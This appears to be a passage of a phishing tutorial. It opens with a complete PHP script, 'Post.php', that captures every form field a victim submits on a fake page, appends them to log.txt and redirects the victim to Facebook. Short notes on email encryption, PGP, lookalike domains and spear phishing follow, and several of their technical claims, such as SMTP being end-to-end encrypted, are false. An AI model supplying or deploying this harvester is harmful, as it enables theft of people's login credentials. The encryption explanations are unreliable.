=Create A Post.php File for saving the data we get from the Phishing Page entered by the Victim and create a new text file through it for saving all the Data..

Creation of Post.php
=====================
<?php        //starting of a php code
header ('Location: https://www.facebook.com');        //redirection to the original webpage 
$handle = fopen("log.txt", "a");        //Creating a text file log.txt to store data & append it
foreach($_POST as $variable => $value) {            //running of a loop until  we didn’t get the value
   fwrite($handle, $variable);        //Writing the Variable Name
   fwrite($handle, "=");        //To define the value of Equals to.
   fwrite($handle, $value);        //For writing the Username of the data
   fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
}        // end of loop
fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
fclose($handle);        //saving and closing the file named log.txt
exit;        // Exiting the PHP code
?>        // End of the PHP Code

Email Encryption
=============
What is encryption? 
Encryption is a Method which converts Plain Text Data which can be readable and understand into a unreadable form of data which is Encoded and cannot be easily readable by humans.

Email Encryption : When we use the service of SMTP and sends a Email to another person, it uses End to End Encryption Method which is having some Public Key, Private Key and some Algorithms.

Public Key is that which can be easily accessible from a CA Server. A Private Key is that which our Authentication Server of the Web Service generates and it merges with the Public Key to Complete the Encryption Process. The algorithm defines the functionality by which a Encryption Method Works.

PGP - Pretty Good Privacy
====================
Pretty Good Privacy or PGP is a popular program used to encrypt and decrypt email over the Internet, as well as authenticate messages with digital signatures and encrypted stored files. This encryption format developed by PGP is used by Emails and applications like Whatsapp nowadays which provides end to end security.

What a Attacker can do?
===================
Attackers can register their own domain names that are similar to the existing web addresses. 
Then they can create their own websites that are, again, the same or very similar to the existing original sites (that usually belong to banks, corporations, email or news services).

Spear Phishing
===========
Spear Phishing Attacks are those in which a Attacker customize their attack emails with the target’s name, position, company, work phone number and other information in an attempt to trick the recipient into believing that they have a connection with the sender.
The goal is the same as normal phishing which is luring the targeted victim into clicking on a malicious URL or email attachment, so that they will hand over their personal data.

Eg. Mail from your Boss of your company.
